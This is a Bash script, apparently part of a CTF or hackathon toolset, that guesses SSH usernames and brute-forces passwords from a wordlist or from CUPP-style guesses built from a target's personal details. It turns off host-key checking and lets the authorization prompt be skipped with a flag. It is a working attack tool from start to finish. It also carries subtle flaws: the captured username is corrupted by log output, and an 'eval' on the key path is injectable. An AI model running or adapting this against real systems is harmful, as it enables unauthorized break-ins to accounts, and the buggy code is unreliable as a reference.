#!/bin/bash
# Probex — Bash edition for ProbeX hackathon TNI AD toolset
# SSH brute force + username guessing + wordlist crack (authorized CTF labs only)

set -euo pipefail

WORDLIST="${PROBEX_SSH_WORDLIST:-$(dirname "$0")/passwords.txt}"
KEY="${PROBEX_SSH_PRIVATE_KEY:-$HOME/.ssh/id_rsa}"
PORT=22
CONFIRM=0
CUPP=0
TARGET=""
VERBOSE=0

usage() {
    cat <<EOF
Usage: $0 [options] <target>
  -p, --port PORT       SSH port (default 22)
  -k, --key PATH        SSH private key (default ~/.ssh/id_rsa)
  -w, --wordlist FILE   Password wordlist (default ./passwords.txt)
  -c, --cupp            Use interactive CUPP profiler for wordlist
  -y, --confirm         Confirm authorization (skip interactive prompt)
  -v, --verbose         Verbose output
  -h, --help            Show this help
EOF
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -p|--port) PORT="$2"; shift 2 ;;
        -k|--key) KEY="$2"; shift 2 ;;
        -w|--wordlist) WORDLIST="$2"; shift 2 ;;
        -c|--cupp) CUPP=1; shift ;;
        -y|--confirm) CONFIRM=1; shift ;;
        -v|--verbose) VERBOSE=1; shift ;;
        -h|--help) usage ;;
        -*) echo "Unknown option: $1" >&2; usage ;;
        *) TARGET="$1"; shift ;;
    esac
done

if [[ -z "$TARGET" ]]; then
    echo "Error: target required" >&2
    usage
fi

# Extract hostname from target (strip scheme if present)
HOST=$(echo "$TARGET" | sed -E 's|^[a-z]+://||' | cut -d: -f1 | cut -d/ -f1)

log() { [[ $VERBOSE -eq 1 ]] && echo "[*] $*" || true; }
err() { echo "[-] $*" >&2; }
ok()  { echo "[+] $*"; }

# Check dependencies
for cmd in ssh timeout; do
    command -v "$cmd" >/dev/null 2>&1 || { err "Required command not found: $cmd"; exit 1; }
done

# Validate key
KEY=$(eval echo "$KEY")
if [[ ! -f "$KEY" ]]; then
    err "Private key not found: $KEY"
    exit 1
fi

# Validate wordlist (non-CUPP mode)
if [[ $CUPP -eq 0 ]]; then
    if [[ ! -f "$WORDLIST" ]]; then
        err "Wordlist not found: $WORDLIST"
        exit 1
    fi
    mapfile -t PASSWORDS < <(grep -v '^[[:space:]]*$' "$WORDLIST")
    if [[ ${#PASSWORDS[@]} -eq 0 ]]; then
        err "Wordlist is empty"
        exit 1
    fi
    ok "Loaded ${#PASSWORDS[@]} passwords from $WORDLIST"
fi

# Common SSH usernames for guessing
COMMON_USERS=(root ubuntu admin user kali debian ctf player blue_crew61)

find_username() {
    log "Auto-detecting valid SSH username on $HOST:$PORT ..."
    local key_data
    key_data=$(timeout 5 ssh-keygen -y -f "$KEY" 2>/dev/null) || { err "Cannot read private key"; return 1; }
    for user in "${COMMON_USERS[@]}"; do
        if timeout 8 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i "$KEY" -p "$PORT" "$user@$HOST" exit 2>/dev/null; then
            ok "Valid username found: $user"
            echo "$user"
            return 0
        fi
    done
    err "No valid username found"
    return 1
}

brute_force() {
    local username="$1"
    log "Starting SSH brute force as $username@$HOST:$PORT ..."

    if [[ $CUPP -eq 1 ]]; then
        # Minimal CUPP-style wordlist generation
        read -rp "First name: " fn
        read -rp "Surname: " sn
        read -rp "Keywords (comma-sep): " kw
        base=($(echo "${fn,,} ${sn,,} ${kw,,}" | tr ',' ' '))
        PASSWORDS=()
        for w in "${base[@]}"; do
            [[ ${#w} -lt 2 ]] && continue
            PASSWORDS+=("$w" "${w^}" "${w^^}")
            PASSWORDS+=("${w//a/@}" "${w//e/3}" "${w//i/1}" "${w//o/0}" "${w//s/5}")
        done
        [[ ${#PASSWORDS[@]} -eq 0 ]] && { err "CUPP generated empty wordlist"; return 1; }
        ok "CUPP generated ${#PASSWORDS[@]} candidates"
    fi

    if [[ $CONFIRM -eq 0 ]]; then
        read -rp "Authorize SSH brute force on $HOST:$PORT as $username? (y/N): " ans
        [[ "${ans,,}" != "y" ]] && { echo "Cancelled."; return 0; }
    fi

    local tried=0 found=0
    for pass in "${PASSWORDS[@]}"; do
        ((tried++))
        if command -v sshpass >/dev/null 2>&1; then
            if timeout 8 sshpass -p "$pass" ssh -o BatchMode=no -o StrictHostKeyChecking=no -p "$PORT" "$username@$HOST" "echo SSH_AUTH_OK" 2>/dev/null | grep -q "SSH_AUTH_OK"; then
                ok "Password found: $pass (user: $username)"
                found=1
                break
            fi
        else
            log "sshpass not installed - cannot attempt password auth ($tried/$pass)"
        fi
        [[ $((tried % 20)) -eq 0 ]] && log "Tried $tried passwords..."
    done
    if [[ $found -eq 0 ]]; then
        err "Brute force completed - no valid password found ($tried tried)"
        return 1
    fi
    return 0
}

main() {
    USER=$(find_username) || exit 1
    brute_force "$USER"
}

main